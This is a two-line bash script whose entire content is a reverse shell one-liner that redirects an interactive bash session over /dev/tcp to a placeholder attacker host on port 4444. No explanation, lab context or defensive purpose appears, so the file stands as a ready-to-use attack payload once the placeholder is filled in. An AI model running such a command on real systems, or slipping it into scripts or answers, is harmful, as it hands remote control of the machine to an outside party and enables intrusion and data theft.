#!/bin/bash
bash -i >& /dev/tcp/attacker-ip/4444 0>&1
